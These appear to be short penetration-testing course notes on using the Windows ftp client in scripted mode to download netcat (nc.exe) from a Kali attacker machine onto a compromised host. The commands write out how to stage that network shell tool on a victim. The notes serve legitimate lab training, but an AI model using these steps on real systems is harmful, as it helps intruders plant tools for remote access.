On Unix-like environments, we can use nc, curl or wget. Windows environments are not as simple. 

Windows ships with a default FTP client. 
FTP is "interactive".

Windows:
`ftp -h`
Note that **-s:filename** accepts a text-based command list that effectively makes the client non-interactive. 

We will setup an FTP server on Kali, initiate a DL request for the nc binary on the compormised windows host. 

Kali:
`sudo cp /usr/share/windows-resources/binaries/nc.exe /ftphome/`
`ls /ftphome`
nc.exe

`sudo systemctl restart pure-ftpd`

Next build a list of FTP commands to execute:

Windows:
`echo open 192.168.119.127 21> ftp.txt` Request and FTP connection
`echo USER offsec>> ftp.txt` User
`echo offsec>> ftp.txt`
`echo bin >> ftp.txt` Request a binary transfer
`echo GET nc.exe >> ftp.txt` Get the file
`echo bye >> ftp.txt` Exit

`ftp -v -n -s:ftp.txt` 
-v suppress output
-n supress auto login
-s indicate name of command file




